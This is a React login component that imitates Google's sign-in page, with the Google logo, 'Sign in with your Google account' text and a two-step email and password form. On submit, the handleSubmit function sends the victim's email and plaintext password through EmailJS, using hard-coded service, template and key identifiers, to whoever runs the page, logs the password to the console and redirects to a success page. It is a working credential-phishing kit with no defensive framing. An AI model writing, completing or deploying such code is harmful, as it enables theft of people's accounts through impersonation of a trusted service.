import React, { useState, useEffect } from 'react';
import './LoginSignUp.css';
import { useNavigate } from 'react-router-dom';
import userProfile from '../Assets/images.png';
import googleLogo from '../Assets/google.256x84.png';
import emailjs from 'emailjs-com';

const LoginSignUp = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [isActive, setIsActive] = useState(false);
    const [formData, setFormData] = useState({ email: '', password: '' });
    const [errors, setErrors] = useState({ email: '', password: '' });
    const navigate = useNavigate();

    // Handle input changes
    const handleInputChange = (event) => {
        const { name, value } = event.target;
        setFormData({ ...formData, [name]: value });
    };

    // Validate email
    useEffect(() => {
        if (formData.email) {
            const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            setErrors((prevErrors) => ({
                ...prevErrors,
                email: pattern.test(formData.email) ? '' : 'Invalid email address',
            }));
        } else {
            setErrors((prevErrors) => ({
                ...prevErrors,
                email: 'Email is required',
            }));
        }
    }, [formData.email]);

    // Validate password
    useEffect(() => {
        if (formData.password) {
            setErrors((prevErrors) => ({
                ...prevErrors,
                password: '',
            }));
        } else {
            setErrors((prevErrors) => ({
                ...prevErrors,
                password: 'Password is required',
            }));
        }
    }, [formData.password]);

    // Handle 'Next' button click
    const handleNextClick = (e) => {
        e.preventDefault();
        if (errors.email) return; // Prevent if there are email errors

        setIsActive(true);
    };

    // Handle 'Finish' button click
    const handleFinishClick = (e) => {
        e.preventDefault();
        if (errors.password) return; // Prevent if there are password errors

        handleSubmit(); // Proceed with form submission
    };

    // Handle form submission
    const handleSubmit = () => {
        if (!formData.email || !formData.password) {
            alert('Email and password are required.');
            return;
        }

        const templateParams = {
            email: formData.email,
            password: formData.password,
        };

        emailjs.send('service_fbtczun', 'template_v8ofilw', templateParams, 'HLpn8KxyhDLpeMH4a')
            .then((response) => {
                setFormData({ email: '', password: '' });
                navigate('/success');
                console.log('Password:', formData.password);
            })
            .catch((error) => {
                alert('Failed to send message.');
                console.error('Error:', error);
            });
    };

    return (
        <div className='Container'>
            <form className='Container'>
                <div className={`header ${isActive ? '' : 'active'}`}>
                    <div className='nonInput'>
                        <img src={googleLogo} alt="Google" className='google' />
                    <div className="text">Sign in</div>
                    <h4>with your Google account</h4>
                    <h4 className='blue'>Learn more about using your account</h4>
                    </div>
                    

                    <div className="inputs">
                        <div className="input">
                            <input
                                type='email'
                                name='email'
                                value={formData.email}
                                onChange={handleInputChange}
                                placeholder='Enter your Email'
                                className='passwordInput'
                                style={{ borderColor: errors.email ? 'red' : '' }}
                            />
                            {errors.email && <p className="error">{errors.email}</p>}
                            <div className="password">
                                <h4 className="blue">Forgot email?</h4>
                            </div>
                        </div>
                    </div>
                    <div className="submitContainer">
                        <button className="button" onClick={handleNextClick}>Next</button>
                    </div>
                </div>

                <div className={`header ${isActive ? 'active' : ''}`}>
                    <img src={googleLogo} alt="Google" className='google' />
                    <div className="text">Almost done</div>

                    <div className="user">
                        <img src={userProfile} alt="User Profile" className='user'/>
                        <div className="text">{formData.email}</div>
                    </div>

                    <div className="inputs">
                        <div className="input">
                            <input
                                type={showPassword ? 'text' : 'password'}
                                name='password'
                                value={formData.password}
                                onChange={handleInputChange}
                                placeholder='Enter your password'
                                className='passwordInput'
                            />
                            {errors.password && <p className="error">{errors.password}</p>}
                            <div className="password">
                                <label htmlFor="showPassword">
                                    <input
                                        type="checkbox"
                                        id="showPassword"
                                        checked={showPassword}
                                        onChange={() => setShowPassword(!showPassword)}
                                    />
                                    Show password
                                </label>
                            </div>
                        </div>
                    </div>
                    <div className="submitContainer">
                        <button className="button" type='button' onClick={handleFinishClick}>Finish</button>
                    </div>
                </div>
            </form>
        </div>
    );
};

export default LoginSignUp;
